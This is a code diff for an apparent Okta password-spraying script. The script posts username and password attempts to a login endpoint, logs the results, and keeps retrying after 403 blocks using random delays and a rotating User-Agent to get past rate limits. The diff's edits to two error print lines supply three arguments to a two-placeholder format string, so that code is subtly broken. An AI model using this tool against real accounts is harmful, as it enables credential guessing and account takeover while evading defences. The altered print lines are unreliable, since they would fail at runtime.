@@ -88,11 +88,11 @@ with open ("%s" % options.inputfile, "r") as oktausers:
                 response.close()
             elif response.status_code == 403:
                 print("\033[93mForbidden access - %s (%s)\033[0m" % (usr, response.status_code))
-                # retry as long as response is 403
+                # Retry as long as response is 403
                 while response.status_code == 403:
                     sleeptime = random.randint(min_wait, max_wait)
-                    print("[+]> repeating the request after wait time]")
-                    print("--Waiting %s seconds..." % sleeptime)
+                    print("[+]> repeating the request after wait time")
+                    print("--Waiting %s seconds..." % (sleeptime,))
                     time.sleep(sleeptime)
                     headers = {'User-Agent': random.choice(user_agents)}
                     response = requests.post(url, headers=headers, json=data)
@@ -103,12 +103,12 @@ with open ("%s" % options.inputfile, "r") as oktausers:
                     elif response.status_code == 401:
                         print("\033[91mAuthentication failed - %s:%s (%s)\033[0m" % (usr, password, response.status_code))
                     else:
-                        print("\033[91mError - %s:%s\033[0m" % (usr, password))
+                        print("\033[91mError - %s:%s\033[0m" % (usr, password, response.status_code))
                 response.close()
             elif response.status_code == 401:
                 print("\033[91mAuthentication failed - %s:%s (%s)\033[0m" % (usr, password, response.status_code))
             else:
-                print("\033[91mError - %s:%s\033[0m" % (usr, password))
+                print("\033[91mError - %s:%s\033[0m" % (usr, password, response.status_code))
 
         except Exception as e:
             print(e)
